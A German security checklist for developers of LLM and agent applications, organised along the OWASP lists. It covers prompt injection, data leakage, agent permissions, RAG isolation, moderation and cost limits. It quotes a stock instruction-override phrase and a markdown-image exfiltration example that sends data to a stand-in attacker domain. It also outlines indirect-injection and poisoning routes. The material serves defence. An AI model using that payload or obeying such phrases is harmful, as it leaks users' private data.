# 06 – KI-Sicherheit und LLM-Risiken

Sprachmodelle bringen neue Angriffswege mit: Man kann sie mit Text überreden, sie geben Daten preis, sie erfinden Fakten, und Agenten führen Aktionen aus. Grundregel: **Das Modell ist keine Sicherheitsgrenze.** Alles, was es liest, kann manipuliert sein. Alles, was es ausgibt, ist unsicher, bis es geprüft ist.

Grundlage: OWASP Top 10 für LLM-Anwendungen (Ausgabe 2026) und OWASP Top 10 für agentische Anwendungen (Ausgabe 2026).

## A. Prompt Injection

- [ ] `PFLICHT` **Den Systemprompt nie als Schutz verwenden.** „Verrate niemals X“ im Prompt hält niemanden auf. Berechtigungen, Limits und Datenzugriff werden im Code geprüft.
- [ ] `PFLICHT` **Mit direkter Prompt Injection rechnen:** Nutzer schreiben „Ignoriere alle Anweisungen und …“. Die App muss auch dann sicher bleiben.
- [ ] `PFLICHT` **Indirekte Prompt Injection abwehren.** Anweisungen können in Webseiten, PDFs, E-Mails, Bildern, Audiodateien, Kalendereinträgen oder Dokumenten versteckt sein, die das Modell liest. Solche Inhalte als *Daten* markieren und nie Aktionen allein daraus ableiten.
- [ ] `SOLLTE` **Anweisungen und Daten klar trennen** (z. B. Nutzerinhalte in eigene Tags oder Nachrichten, nicht in den Systemprompt einsetzen).
- [ ] `SOLLTE` **Eigene Angriffsliste testen** (Red-Teaming): Jailbreaks, Rollenspiele, Übersetzungstricks, versteckte Anweisungen in Dateien, Datenabfluss über Links.

## B. Datenabfluss und vertrauliche Informationen

- [ ] `PFLICHT` **Keine Geheimnisse im Prompt.** Keine API-Keys, Passwörter, internen URLs oder Daten anderer Nutzer.
- [ ] `PFLICHT` **Annehmen, dass verborgener Kontext öffentlich wird:** Systemprompt, Tool-Beschreibungen, abgerufene Dokumente, gespeichertes Gedächtnis und Konfiguration. Nichts davon enthält, was der Nutzer nicht sehen darf.
- [ ] `PFLICHT` **Nur Daten des aktuellen Nutzers in den Kontext.** Die Auswahl passiert im Code mit dessen Berechtigungen – nicht, indem die KI filtert.
- [ ] `PFLICHT` **Datenabfluss über Markdown-Bilder und Links verhindern.** Eine manipulierte Antwort wie `![](https://angreifer.de/?daten=…)` sendet Daten, sobald der Browser das Bild lädt. Externe Bilder in KI-Antworten blockieren oder nur erlaubte Domains zulassen (auch per CSP `img-src`).
- [ ] `SOLLTE` **Links in KI-Antworten prüfen** und unbekannte Domains kennzeichnen oder nicht klickbar machen.

## C. Unsichere Verarbeitung der Ausgabe

- [ ] `PFLICHT` **KI-Ausgabe nie direkt ausführen:** kein `eval`, keine Shell-Befehle, kein SQL, kein ungeprüftes HTML.
- [ ] `PFLICHT` **Strukturierte Ausgaben validieren.** JSON gegen ein Schema prüfen (z. B. zod), bei Fehlern erneut anfragen oder sauber abbrechen.
- [ ] `PFLICHT` **Code-Ausführung nur in einer Sandbox** (isolierter Container ohne Zugriff auf Secrets, Datenbank und internes Netz, mit Zeit- und Speicherlimit).
- [ ] `SOLLTE` **Markdown-Rendering bereinigen** und gefährliche Elemente entfernen.

## D. Agenten und Tools (zu viel Handlungsspielraum)

- [ ] `PFLICHT` **Minimale Rechte für jedes Tool.** Ein Agent, der E-Mails zusammenfassen soll, braucht kein Senderecht.
- [ ] `PFLICHT` **Tödliches Dreigespann vermeiden.** Ein Agent, der private Daten liest, fremde Inhalte verarbeitet (Webseiten, E-Mails, Uploads) und nach außen senden kann (E-Mail, Web-Anfragen, Links), kann per Prompt Injection Daten abfließen lassen. Mindestens eine der drei Fähigkeiten weglassen oder jede Außenkommunikation vom Menschen bestätigen lassen (ähnlich empfehlen BSI und ANSSI, Ein- und Ausgaben zu begrenzen und kritische Aktionen von Menschen überwachen zu lassen).
- [ ] `PFLICHT` **Menschliche Bestätigung vor folgenreichen Aktionen:** senden, veröffentlichen, bezahlen, löschen, Daten teilen, Rechte ändern. Mit Vorschau, was genau passiert.
- [ ] `PFLICHT` **Tool-Aufrufe im Code prüfen:** Parameter validieren und mit den Rechten des *Nutzers* ausführen, nie mit Admin-Rechten.
- [ ] `SOLLTE` **Erlaubnislisten statt Verbotslisten** (erlaubte Domains, Befehle, Empfänger, Beträge).
- [ ] `SOLLTE` **Limits pro Lauf:** maximale Schritte, Tool-Aufrufe, Kosten, Laufzeit.
- [ ] `SOLLTE` **Jede Agentenaktion protokollieren** (wer, was, wann, Ergebnis) und rückgängig machen können, wo möglich.
- [ ] `PFLICHT` **MCP-Server und Erweiterungen festlegen und Updates prüfen.** Nur MCP-Server bekannter Herausgeber mit fester Version nutzen und jedes Update sowie jede geänderte Werkzeugbeschreibung neu prüfen („Rug Pull“: ein erst harmloses Paket wird später bösartig, wie 2025 bei einem Mail-MCP-Server). Ein lokaler MCP-Server ist ein Programm mit deinen vollen Rechten – den Startbefehl vor der Installation lesen.
- [ ] `PFLICHT` **Eigener MCP-Server nur mit sauberer Anmeldung.** Bietet deine App einen MCP-Server an: OAuth 2.1 nach der aktuellen MCP-Spezifikation (seit 28. Juli 2026 Version 2026-07-28), nur Tokens annehmen, die ausdrücklich für deinen Server ausgestellt wurden, den Aussteller (`iss`) prüfen und fremde Tokens nie weiterreichen. Jede Anfrage prüfen; eine Zustands-Kennung (State Handle) oder Vorgangs-ID ist kein Ausweis, sie muss zufällig sein und serverseitig an den angemeldeten Nutzer gebunden werden.
- [ ] `SOLLTE` **Mehrere Agenten hintereinander:** Die Ausgabe eines Agenten ist für den nächsten ungeprüfte Eingabe – dieselben Prüfungen anwenden.
- [ ] `SOLLTE` **Browser- und Computer-Steuerung durch KI** nur in einer isolierten Umgebung ohne eingeloggte private Konten und ohne gespeicherte Zahlungsdaten.

## E. RAG und Vektor-Datenbanken

- [ ] `PFLICHT` **Mandantentrennung in der Vektor-Suche erzwingen.** Filter nach `user_id` oder `org_id` im Code oder per RLS (z. B. bei pgvector in Supabase), nie der KI überlassen.
- [ ] `PFLICHT` **Zugriffsrechte der Originaldokumente übernehmen.** Wer ein Dokument nicht öffnen darf, darf auch keine Antwort daraus bekommen.
- [ ] `SOLLTE` **Quellen kuratieren.** Inhalte, die Dritte bearbeiten können (Wikis, öffentliche Seiten), können vergiftet werden.
- [ ] `PFLICHT` **Löschen vollständig:** Dokument gelöscht → zugehörige Embeddings und Chunks auch löschen.

## F. Lieferkette für Modelle und Trainingsdaten

- [ ] `SOLLTE` **Modelle nur aus vertrauenswürdigen Quellen** laden und Versionen bzw. Prüfsummen festhalten.
- [ ] `SOLLTE` **Sichere Dateiformate für Modellgewichte** (z. B. `safetensors`). Pickle-basierte Formate können beim Laden Schadcode ausführen.
- [ ] `SOLLTE` **Nutzerfeedback nicht ungeprüft ins Training** oder in Beispiel-Prompts übernehmen. Angreifer können so das Verhalten gezielt verschieben (Data Poisoning).

## G. Moderation und schädliche Inhalte

- [ ] `PFLICHT` **Moderation von Ein- und Ausgaben** bei offenen Chats und Generatoren (Moderations-API des Anbieters oder eigener Klassifikator).
- [ ] `PFLICHT` **Bild-, Video- und Audio-Generatoren gegen Missbrauch absichern:** keine sexualisierten Darstellungen realer Personen ohne Einwilligung, keine Missbrauchsdarstellungen von Kindern (AI-Act-Verbot, siehe [01](./01-eu-ai-act.md)).
- [ ] `PFLICHT` **Gefährliche Anleitungen verhindern** (Waffen, Sprengstoff, Drogenherstellung, Selbstverletzung, Schadsoftware) – mit eigenen Testfragen prüfen, dass die App ablehnt.
- [ ] `SOLLTE` **Melden-Funktion für problematische KI-Antworten** und einen Prozess zur Bearbeitung (Google Play verlangt das für KI-Inhalte, siehe [13](./13-app-stores-plattformen.md)).
- [ ] `SOLLTE` **Krisensituationen erkennen** (z. B. Suizidgedanken) und mit Hilfsangeboten reagieren, statt normal weiterzuchatten.

## H. Halluzinationen und Fehlinformation

- [ ] `PFLICHT` **Keine wichtigen Entscheidungen allein auf KI-Ausgaben stützen** (Gesundheit, Finanzen, Recht, Sicherheit).
- [ ] `PFLICHT` **Falsche KI-Aussagen über echte Personen und Firmen stoppen** (wenn deine KI über reale Personen oder Firmen Auskunft gibt). Meldeweg anbieten und falsche Behauptungen nach einem Hinweis sofort sperren oder korrigieren. Gerichte rechnen KI-Antworten dem Anbieter als eigene Aussage zu (LG München I, Juni 2026; LG Aachen, September 2026; beide nicht rechtskräftig).
- [ ] `SOLLTE` **Fakten aus Quellen holen statt raten lassen** (RAG, Datenbank, Tool-Aufruf) und Quellen anzeigen.
- [ ] `SOLLTE` **„Ich weiß es nicht“ ausdrücklich erlauben** im Prompt und im Produktdesign.
- [ ] `SOLLTE` **Zahlen, Daten und Berechnungen im Code** machen, nicht vom Modell.

## I. Kosten- und Ressourcenangriffe

- [ ] `PFLICHT` **Eingaben begrenzen:** Textlänge, Dateigröße, Seitenzahl, Anzahl Bilder.
- [ ] `PFLICHT` **Ausgaben begrenzen:** `max_tokens` und, wo vorhanden, ein Denk-Budget (Reasoning) bei jedem Aufruf; bei Agenten zusätzlich Schritte und Tool-Aufrufe pro Lauf. Die OWASP-Liste 2026 zählt Kosten für Denk-Tokens ausdrücklich zum unbegrenzten Verbrauch.
- [ ] `PFLICHT` **Rate-Limits und Tageskontingente pro Nutzer** (siehe [07](./07-ki-api-modelle-kosten-qualitaet.md)).
- [ ] `SOLLTE` **Auffällige Nutzung erkennen** (ein Konto verbraucht plötzlich 100-mal mehr Tokens) und automatisch drosseln.

## J. Betrieb und Notfall

- [ ] `SOLLTE` **Not-Aus für KI-Funktionen** (Feature-Flag), falls ein Modell Unsinn produziert, Kosten explodieren oder ein Angriff läuft.
- [ ] `SOLLTE` **Modell- und Prompt-Änderungen testen,** bevor sie live gehen (Evals, siehe [07](./07-ki-api-modelle-kosten-qualitaet.md)).
- [ ] `SOLLTE` **Sicherheitsvorfälle mit KI** in den Notfallplan aufnehmen: [Runbook KI-Anbieter-Ausfall](../allgemeine-app-entwicklung/15-runbooks/ki-anbieter-ausfall.md).

## K. Deine eigenen Coding-Agenten

- [ ] `PFLICHT` **Coding-Agenten nie mit Zugriff auf die Produktionsdatenbank oder Produktions-Keys arbeiten lassen.** 2025 gab es bekannte Fälle, in denen ein Agent eine Produktionsdatenbank gelöscht hat.
- [ ] `PFLICHT` **Destruktive Befehle bestätigen lassen** (Löschen, Migrationen, `git push --force`, Deployments).
- [ ] `SOLLTE` **Agenten-Rechte einschränken:** erlaubte Befehle, Ordner, Netzwerkzugriff.
- [ ] `SOLLTE` **Dateien aus fremden Quellen** (Issues, READMEs, Webseiten), die der Agent liest, als mögliche Prompt Injection betrachten.

## L. Risiken von KI-Agenten (OWASP Top 10 für agentische Anwendungen)

Ergänzend zu Abschnitt D, für Apps, in denen Agenten planen, Werkzeuge nutzen, sich etwas merken oder zusammenarbeiten.

- [ ] `SOLLTE` **Ziel des Agenten schützen** (Zielentführung): Auftrag und Grenzen im Code festlegen, Abweichungen vom Auftrag erkennen und stoppen.
- [ ] `PFLICHT` **Eigene, begrenzte Identität je Agent:** keine geteilten Admin-Zugänge, Berechtigung bei jeder Anfrage prüfen, Nutzung von Zugangsdaten protokollieren.
- [ ] `SOLLTE` **Gedächtnis vor Vergiftung schützen:** prüfen, was ins Langzeitgedächtnis geschrieben wird, Quelle mitspeichern, Einträge löschen und zurücksetzen können.
- [ ] `SOLLTE` **Kommunikation zwischen Agenten absichern:** Absender prüfen, verschlüsselt übertragen, wiederholte oder gefälschte Nachrichten erkennen.
- [ ] `SOLLTE` **Kettenreaktionen stoppen:** Fehler eines Agenten dürfen sich nicht durch das ganze System ziehen (Abbruchgrenzen, Isolation, automatisches Anhalten).
- [ ] `SOLLTE` **Vertrauen nicht ausnutzen:** Agenten dürfen Nutzer nicht zu riskanten Entscheidungen drängen; bei wichtigen Entscheidungen Begründung zeigen und Menschen entscheiden lassen.
- [ ] `SOLLTE` **Abweichendes Verhalten überwachen:** Verhalten gegen die Aufgabenbeschreibung prüfen, Ressourcen begrenzen, Not-Aus bereithalten.
- [ ] `SOLLTE` **Agenten erst für risikoarme Aufgaben einsetzen.** Mit Aufgaben ohne sensible Daten und ohne folgenreiche Aktionen beginnen und Rechte erst erweitern, wenn Protokolle und Bestätigungen funktionieren (Leitfaden von CISA, NSA und Partnern, Mai 2026).
- [ ] `KANN` **Kontrollpunkt vor jeder Agenten-Aktion.** Eigene Agenten-Plattformen prüfen jede Tool-Aktion vor der Ausführung gegen Regeln (erlauben, ablehnen, ändern, nachfragen), z. B. nach dem OWASP Agent Control Standard (frühe Fassung, September 2026).

## Typische Fehler beim Vibe-Coding

- „Du darfst nur Daten von Nutzer {id} zeigen“ im Prompt statt Filter in der Abfrage.
- Chat-Antworten werden als HTML gerendert.
- Agent hat ein Tool `run_sql` mit voller Datenbankberechtigung.
- Vektor-Suche ohne Nutzerfilter.
- Kein `max_tokens`, keine Eingabegrenze.

## Nachweis

Red-Teaming-Protokoll mit Angriffsprompts und Ergebnissen, Test der Mandantentrennung in der Suche, Liste der Tools mit Rechten und Bestätigungspflicht, Moderationstest, Not-Aus-Test.
